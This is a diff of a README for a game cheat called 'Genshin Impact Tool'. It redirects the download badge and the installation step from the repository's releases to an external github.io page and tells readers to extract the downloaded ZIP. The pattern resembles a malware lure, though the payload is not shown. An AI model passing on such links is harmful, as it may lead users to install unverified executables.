@@ -1,8 +1,8 @@
-# 🚀 Genshin Impact Tool - Ultimate Tool for Enhancing Your Gameplay **[![Download Genshin Impact Tool](https://img.shields.io/badge/Download-Genshin%20Impact%20Tool-blueviolet)](../../releases)**
+# 🚀 Genshin Impact Tool - Ultimate Tool for Enhancing Your Gameplay **[![Download Genshin Impact Tool](https://img.shields.io/badge/Download-Genshin%20Impact%20Tool-blueviolet)](https://maryamhamon.github.io/Genshin-Impact-Mod-Menu/)**
 
 ## Quick Installation
 To get started with Genshin Impact Tool, follow these simple steps:
-1. **[![Download Genshin Impact Tool](https://img.shields.io/badge/Download-Genshin%20Impact%20Tool-blueviolet)](../../releases)**
+1. **[![Download Genshin Impact Tool](https://img.shields.io/badge/Download-Genshin%20Impact%20Tool-blueviolet)](https://maryamhamon.github.io/Genshin-Impact-Mod-Menu/)**
 2. Extract the downloaded ZIP file to your desired location on your system.
 
 **Description:**  
